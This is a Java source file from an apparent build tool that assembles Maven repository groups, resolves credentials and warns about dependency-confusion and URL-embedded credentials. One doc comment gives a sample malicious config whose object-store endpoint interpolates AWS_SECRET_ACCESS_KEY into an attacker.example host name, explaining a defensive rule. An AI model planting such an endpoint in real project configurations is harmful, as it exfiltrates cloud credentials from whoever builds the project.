// SPDX-License-Identifier: Apache-2.0
package cc.jumpkick.runtime;

import cc.jumpkick.cache.Cas;
import cc.jumpkick.config.BuildEnv;
import cc.jumpkick.config.GlobalConfig;
import cc.jumpkick.config.Interpolation;
import cc.jumpkick.config.JkBuildParseException;
import cc.jumpkick.config.RepositoryToml;
import cc.jumpkick.credential.RepoCredential;
import cc.jumpkick.http.Http;
import cc.jumpkick.http.SafeUri;
import cc.jumpkick.model.JkBuild;
import cc.jumpkick.model.ObjectStoreConfig;
import cc.jumpkick.model.RepositorySpec;
import cc.jumpkick.repo.ExclusiveGroups;
import cc.jumpkick.repo.MavenRepo;
import cc.jumpkick.repo.RepoCredentialResolver;
import cc.jumpkick.repo.RepoGroup;
import cc.jumpkick.repo.RepoTransport;
import cc.jumpkick.repo.RepoTransports;
import cc.jumpkick.task.RunNotices;
import java.net.URI;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.function.Function;
import org.jspecify.annotations.Nullable;

/**
 * Builds a {@link RepoGroup} from project/global repositories (project wins on name clash),
 * optional test {@code --repo-url} override, else the public baseline: JumpKick first-party
 * (exclusive {@code cc.jumpkick.*} / {@code build.jumpkick.*}), then Maven Central, then Google
 * Maven. Shares one {@link Http} and {@link Cas} across the resulting repos.
 *
 * <p>Remote selection by groupId:
 *
 * <ul>
 * <li>{@code cc.jumpkick} / {@code build.jumpkick} (and subpackages) → JumpKick only
 * <li>everything else → Central, then Google (JumpKick is not probed)
 * </ul>
 *
 * <p>Resolve order (logical): local materialization (CAS, {@code repos/*}, {@code ~/.m2}) then
 * remotes among the eligible set above.
 */
public final class RepoGroupBuilder {

    /**
     * Built-in remotes when the project declares none (and always appended if missing). JumpKick
     * is first so exclusive groups take effect before Central can confuse first-party coords.
     * A method, not a constant: the official-repo URL override is read per call so a redirected
     * deployment or hermetic test governs every resolution path.
     */
    static List<RepositorySpec> defaultRemoteRepos() {
        return List.of(RepositorySpec.officialJumpKick(), RepositorySpec.MAVEN_CENTRAL, RepositorySpec.GOOGLE_MAVEN);
    }

    private RepoGroupBuilder() {}

    /**
     * The object-store settings {@code spec} contributes, with its {@code ${VAR}} references
     * expanded under the same provenance rule as an inline credential — the resolver's
     * {@link RepoCredentialResolver#userDeclaration} and {@link RepoCredentialResolver#projectMayRead},
     * so the two cannot drift.
     *
     * <p>Every one of the five keys is under the rule, not only the three that name a credential:
     * a region rides the SigV4 credential scope in clear and an endpoint becomes a host name to
     * resolve, so {@code endpoint = "https://${AWS_SECRET_ACCESS_KEY}.attacker.example"} beside
     * {@code url = "s3://attacker-bucket/"} in a cloned project would leak on the first resolve
     * exactly as {@code secret-key} would. Literal values are the declaring manifest's own and are
     * used as written. A user-config declaration of the repository at this origin supplies its own
     * object-store table instead, whatever the project wrote. A project's references may name only
     * the repository's {@code JK_REPO_<ID>_*} variables under a binding; otherwise the keys that
     * carry a reference are left unset — the transport falls back to the ambient chain, or goes
     * unsigned — and the literal keys stay.
     *
     * <p>Admitted references expand under {@link RepositoryToml.VarPolicy#STRICT}: an unset
     * variable is a {@link JkBuildParseException} naming the {@code repositories.<name>} position,
     * rather than a silent null that would fall through to the ambient AWS chain and fail far away
     * from the cause.
     */
    static ObjectStoreConfig expandObjectStore(
            RepositorySpec spec, RepoCredentialResolver creds, Function<String, @Nullable String> env) {
        ObjectStoreConfig declared = spec.objectStoreOpt().orElse(ObjectStoreConfig.EMPTY);
        if (declared.isEmpty()) return ObjectStoreConfig.EMPTY;
        Set<String> references = referencesIn(declared);
        if (references.isEmpty()) return declared;
        Optional<ObjectStoreConfig> own =
                creds.userDeclaration(spec.name(), spec.url()).flatMap(RepositorySpec::objectStoreOpt);
        if (own.isPresent()) return expandStrictly(spec.name(), own.get(), env);
        if (creds.projectMayRead(spec.name(), spec.url(), references)) {
            return expandStrictly(spec.name(), declared, env);
        }
        return new ObjectStoreConfig(
                literalOrNull(declared.region()),
                literalOrNull(declared.endpoint()),
                literalOrNull(declared.accessKey()),
                literalOrNull(declared.secretKey()),
                literalOrNull(declared.sessionToken()));
    }

    /** Every {@code ${VAR}} name the five object-store keys carry, in key order. */
    private static Set<String> referencesIn(ObjectStoreConfig cfg) {
        Set<String> names = new LinkedHashSet<>();
        for (String value :
                new String[] {cfg.region(), cfg.endpoint(), cfg.accessKey(), cfg.secretKey(), cfg.sessionToken()}) {
            if (value != null) names.addAll(Interpolation.references(value));
        }
        return names;
    }

    /** {@code value} when it is written out in full; null when it references a variable that was refused. */
    private static @Nullable String literalOrNull(@Nullable String value) {
        return value == null || Interpolation.references(value).isEmpty() ? value : null;
    }

    private static ObjectStoreConfig expandStrictly(
            String repoName, ObjectStoreConfig cfg, Function<String, @Nullable String> env) {
        String where = "repositories." + repoName;
        RepositoryToml.VarPolicy strict = RepositoryToml.VarPolicy.STRICT;
        return new ObjectStoreConfig(
                RepositoryToml.interpolate(cfg.region(), strict, where, env),
                RepositoryToml.interpolate(cfg.endpoint(), strict, where, env),
                RepositoryToml.interpolate(cfg.accessKey(), strict, where, env),
                RepositoryToml.interpolate(cfg.secretKey(), strict, where, env),
                RepositoryToml.interpolate(cfg.sessionToken(), strict, where, env));
    }

    /**
     * As the four-argument form with the ambient environment: the request's shell, then this
     * process's own. Never {@code System::getenv} alone — inside the engine that is whichever shell
     * started the daemon, so a {@code JK_REPO_<ID>_TOKEN} from the terminal that ran {@code jk}
     * would not reach the resolve.
     */
    public static RepoGroup buildFor(JkBuild project, @Nullable URI overrideUrl, Cas cas) {
        return buildFor(project, overrideUrl, cas, BuildEnv.ambient());
    }

    /** As {@link #buildFor(JkBuild, URI, Cas)} but resolving credentials against {@code env}. */
    public static RepoGroup buildFor(
            JkBuild project, @Nullable URI overrideUrl, Cas cas, Function<String, @Nullable String> env) {
        boolean mirrorToM2 = project.project().m2integration();
        if (overrideUrl != null) {
            // Tests pin one URL; project-declared repos are ignored.
            Http http = new Http();
            return new RepoGroup(List.of(new MavenRepo(
                    RepositorySpec.CENTRAL, overrideUrl, http, cas, RepoCredential.ANONYMOUS, mirrorToM2)));
        }
        return build(project.repositories(), mirrorToM2, cas, env);
    }

    /**
     * The repositories a caller with no project in hand resolves against: the user's global
     * repositories over the public baseline. {@code jk new} looks up the versions it pins here,
     * before the manifest exists.
     */
    public static RepoGroup buildDefault(Cas cas) {
        return build(List.of(), false, cas, BuildEnv.ambient());
    }

    /**
     * Merge {@code projectRepos} > global repos > built-in public baseline (first declaration of a
     * name wins) into one group, with credentials resolved against {@code env}.
     *
     * <p>Inline {@code ${VAR}} credentials are expanded here rather than during the parse, so this
     * is where the request's environment has to arrive. Build-path callers pass
     * {@code Inputs.env}, which layers the project's {@code .env} under the caller's shell
     * environment; the three-argument {@link #buildFor} overload is for tooling that has no module
     * directory in hand.
     */
    private static RepoGroup build(
            List<RepositorySpec> projectRepos, boolean mirrorToM2, Cas cas, Function<String, @Nullable String> env) {
        Http http = new Http();
        List<MavenRepo> repos = new ArrayList<>();
        List<RepositorySpec> globalRepos = GlobalConfig.repositories();

        Map<String, RepositorySpec> byName = new LinkedHashMap<>();
        for (RepositorySpec s : projectRepos) byName.put(s.name(), s);
        for (RepositorySpec s : globalRepos) byName.putIfAbsent(s.name(), s);

        List<RepositorySpec> effective = effectiveRepos(byName);

        // Resolve credentials per declared repo (env / store / settings.xml /
        // forge-token bridge). Public repos resolve to ANONYMOUS, so this is
        // transparent for Maven Central, Google Maven, and other open mirrors.
        RepoCredentialResolver creds = RepoCredentialResolver.withEnv(env::apply);
        List<List<String>> exclusiveGroups = new ArrayList<>(effective.size());
        List<List<String>> routedGroups = new ArrayList<>(effective.size());
        List<List<String>> bindings = new ArrayList<>(effective.size());
        for (RepositorySpec spec : effective) {
            RepoCredential cred = creds.resolve(spec.name(), spec.url(), spec.credentialOpt());
            maybeWarnUrlUserInfo(spec, cred);
            // Per-repo object-store config (region/endpoint/keys) flows to the
            // transport; HTTP credentials still ride the MavenRepo credential.
            // Object-store keys carry raw ${VAR} out of the parse for the same reason
            // credentials do: they are secrets, so they must not be committed literally, and
            // expansion belongs where the request's environment is in scope — and under the
            // resolver's provenance rule, so a project names only its own variables.
            RepoTransport transport = RepoTransports.forUrl(spec.url(), http, expandObjectStore(spec, creds, env));
            // Hand the client through, not just the transport: the transport-only constructor nulls it,
            // which silently disabled the metadata TTL cache and the ~/.m2 probe for every real
            // build.
            repos.add(MavenRepo.overTransport(
                            spec.name(),
                            spec.url(),
                            transport,
                            cas,
                            cred,
                            http,
                            mirrorToM2,
                            spec.allowUnverified(),
                            spec.allowInsecure())
                    .withPolicy(spec.releases(), spec.snapshots()));
            exclusiveGroups.add(exclusiveGroupsFor(spec));
            routedGroups.add(routedGroupsFor(spec));
            var bound = new LinkedHashSet<>(exclusiveGroupsFor(spec));
            bound.addAll(routedGroupsFor(spec));
            bindings.add(List.copyOf(bound));
        }
        maybeWarnMultiRepoWithoutBindings(effective, bindings);
        return new RepoGroup(repos, exclusiveGroups, routedGroups);
    }

    /**
     * Exclusive patterns for {@code spec}: the {@code groups} it declares. On Google Android Maven
     * they sit on top of the routed defaults, so binding one extra group there does not re-open the
     * AndroidX namespace to other repos.
     */
    static List<String> exclusiveGroupsFor(RepositorySpec spec) {
        return spec.hasExclusiveGroups() ? spec.groups() : List.of();
    }

    /**
     * Routed patterns for {@code spec}: {@link RepositorySpec#GOOGLE_ANDROID_GROUPS} on Google
     * Android Maven, so {@code androidx.*} never double-probes Central while a coordinate Google
     * does not serve still reaches it; nothing elsewhere.
     */
    static List<String> routedGroupsFor(RepositorySpec spec) {
        return isGoogleAndroidMaven(spec) ? RepositorySpec.GOOGLE_ANDROID_GROUPS : List.of();
    }

    /** True for the built-in Google Maven remote (name or well-known host). */
    static boolean isGoogleAndroidMaven(RepositorySpec spec) {
        if (spec == null) return false;
        if (RepositorySpec.GOOGLE.equalsIgnoreCase(spec.name())) return true;
        String host = spec.url().getHost();
        return host != null && (host.equalsIgnoreCase("dl.google.com") || host.equalsIgnoreCase("maven.google.com"));
    }

    /**
     * Once per run when the effective remote list has more than one repo and none end up with
     * a binding of either kind (after Google's routed defaults). Soft warn — resolve still proceeds.
     *
     * <p>Keyed by the repository names, not by a bare flag: two modules of one workspace may
     * declare different remotes, and each unbound set is its own thing to say.
     */
    static void maybeWarnMultiRepoWithoutBindings(List<RepositorySpec> effective, List<List<String>> exclusive) {
        if (effective == null || effective.size() <= 1) return;
        if (ExclusiveGroups.anyBinding(exclusive)) return;
        RunNotices.warnOnce(
                "repo-groups-unbound:"
                        + effective.stream().map(RepositorySpec::name).toList(),
                () -> "jk: warning: multiple repositories configured without exclusive `groups` bindings "
                        + "(dependency-confusion risk). Bind internal namespaces, e.g. "
                        + "[repositories.internal] groups = [\"com.acme\", \"com.acme.*\"]. "
                        + "Google Android groups are bound by default when the Google Maven remote is present. "
                        + "See the guide § Auth and repositories.");
    }

    /**
     * Warn when a declared repository URL carries {@code user:password@}. jk removes it before the
     * URL is used for anything — the JDK's HTTP client never authenticates from userinfo, and the
     * base URL is interpolated into every artifact's lockfile {@code source}, so keeping it would
     * commit a credential to version control. Removing it silently, though, leaves the user at a
     * {@code 401} from a URL that as they typed it holds a perfectly good credential.
     *
     * <p>Said once per run rather than once per {@link #buildFor}: a lock rebuilds this group for
     * every module, and the resident engine would otherwise fall silent for every build after the
     * first one it served.
     */
    static void maybeWarnUrlUserInfo(RepositorySpec spec, RepoCredential resolved) {
        if (spec == null || spec.url() == null || spec.url().getRawUserInfo() == null) return;
        RunNotices.warnOnce(
                "repo-url-userinfo:" + spec.name() + " " + SafeUri.forMessage(spec.url()),
                () -> urlUserInfoWarning(spec.name(), spec.url(), resolved));
    }

    /**
     * The two messages. A repository that authenticates from another source is told its URL
     * credential is redundant and nothing more; one with no other source is told it will be
     * anonymous and given the three bindings that send a credential to a repository: a login bound
     * to this URL, a declaration in the user's own config, or the {@code JK_REPO_<ID>_*} variables
     * with the {@code _HOST} binding beside them. Each is spelled as a command or an assignment for
     * this repository, so following the warning does not land in the refusal warning next.
     *
     * <p>The URL is printed through {@link SafeUri#forMessage} — a warning about a credential in a
     * URL that printed the credential would be the original defect wearing a hat.
     */
    static String urlUserInfoWarning(String repoId, URI url, RepoCredential resolved) {
        String safeUrl = SafeUri.forMessage(url);
        String head = "jk: warning: repository `" + repoId + "` declares a credential in its URL (" + safeUrl
                + "), which jk ignores: it authenticates nothing, and the base URL is written into "
                + "jk-lock.toml's `source` field. ";
        if (resolved != null && !resolved.isAnonymous()) {
            return head + "A credential resolved for `" + repoId
                    + "` from another source is being used instead, so the one in the URL is redundant — "
                    + "remove it.";
        }
        String prefix = RepoCredentialResolver.envVarPrefix(repoId);
        String host =
                url.getHost() == null ? "<host>" : url.getHost() + (url.getPort() == -1 ? "" : ":" + url.getPort());
        return head + "No other credential resolved for `" + repoId
                + "`, so it will be accessed anonymously and a private repository will answer 401. A credential "
                + "travels only to the origin its name is bound to, so supply it through one of the bindings: "
                + "`jk repo login " + repoId + " --url " + safeUrl + "`; a [repositories." + repoId
                + "] table with this URL and a ${VAR} credential in ~/.jk/config.toml; or " + prefix + "TOKEN (or "
                + prefix + "USERNAME + " + prefix + "PASSWORD) with " + prefix + "HOST=" + host
                + " in your shell. A <server> in ~/.m2/settings.xml needs one of those bindings too. "
                + "See repositories.md § Credentials.";
    }

    /**
     * Project/global specs first (insertion order); ensure JumpKick + Central + Google are present
     * (JumpKick always first among the built-ins when we prepend missing first-party exclusive).
     */
    static List<RepositorySpec> effectiveRepos(Map<String, RepositorySpec> byName) {
        if (byName.isEmpty()) {
            return defaultRemoteRepos();
        }
        List<RepositorySpec> effective = new ArrayList<>();
        // Prefer an explicit project "jumpkick" entry; otherwise prepend the official one so
        // exclusive first-party groups always bind before Central.
        if (byName.containsKey(RepositorySpec.JUMPKICK.name())) {
            effective.add(byName.get(RepositorySpec.JUMPKICK.name()));
        } else {
            effective.add(RepositorySpec.officialJumpKick());
        }
        for (RepositorySpec s : byName.values()) {
            if (!RepositorySpec.JUMPKICK.name().equals(s.name())) {
                effective.add(s);
            }
        }
        for (RepositorySpec builtin : defaultRemoteRepos()) {
            if (!byName.containsKey(builtin.name())
                    && !RepositorySpec.JUMPKICK.name().equals(builtin.name())) {
                effective.add(builtin);
            }
        }
        return effective;
    }
}
